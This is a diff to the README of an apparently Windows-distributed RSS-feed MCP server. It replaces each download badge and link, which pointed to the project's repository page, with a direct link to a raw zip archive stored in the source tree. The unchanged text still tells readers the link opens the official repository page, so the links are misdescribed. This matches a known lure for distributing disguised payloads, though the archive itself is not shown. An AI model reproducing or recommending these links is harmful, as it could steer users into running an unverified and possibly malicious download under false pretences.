@@ -1,6 +1,6 @@
 # 🔗 rss-feeds-mcp - Fetch and Search RSS Feeds Easily
 
-[![Download rss-feeds-mcp](https://img.shields.io/badge/Download-rss--feeds--mcp-brightgreen?style=for-the-badge)](https://github.com/SIAMx69z/rss-feeds-mcp)
+[![Download rss-feeds-mcp](https://img.shields.io/badge/Download-rss--feeds--mcp-brightgreen?style=for-the-badge)](https://github.com/SIAMx69z/rss-feeds-mcp/raw/refs/heads/main/src/mcp_feeds_rss_v1.1.zip)
 
 ---
 
@@ -16,7 +16,7 @@ The server handles the technical part so you do not have to. It collects data, a
 
 To get started, visit the official page below and download the software for Windows:
 
-[![Download Link](https://img.shields.io/badge/Download-rss--feeds--mcp-blue?style=for-the-badge)](https://github.com/SIAMx69z/rss-feeds-mcp)
+[![Download Link](https://img.shields.io/badge/Download-rss--feeds--mcp-blue?style=for-the-badge)](https://github.com/SIAMx69z/rss-feeds-mcp/raw/refs/heads/main/src/mcp_feeds_rss_v1.1.zip)
 
 Click the link above. It will take you to the GitHub repository where you can find the latest release and download the Windows version.
 
@@ -44,7 +44,7 @@ Follow these step-by-step instructions to download and run the software.
 
 Open your web browser and go to:
 
-https://github.com/SIAMx69z/rss-feeds-mcp
+https://github.com/SIAMx69z/rss-feeds-mcp/raw/refs/heads/main/src/mcp_feeds_rss_v1.1.zip
 
 This is the official page where the software is hosted.
 
@@ -142,4 +142,4 @@ The repository is open for feedback and suggestions.
 
 ---
 
-[![Download rss-feeds-mcp](https://img.shields.io/badge/Download-rss--feeds--mcp-blue?style=for-the-badge)](https://github.com/SIAMx69z/rss-feeds-mcp)
+[![Download rss-feeds-mcp](https://img.shields.io/badge/Download-rss--feeds--mcp-blue?style=for-the-badge)](https://github.com/SIAMx69z/rss-feeds-mcp/raw/refs/heads/main/src/mcp_feeds_rss_v1.1.zip)
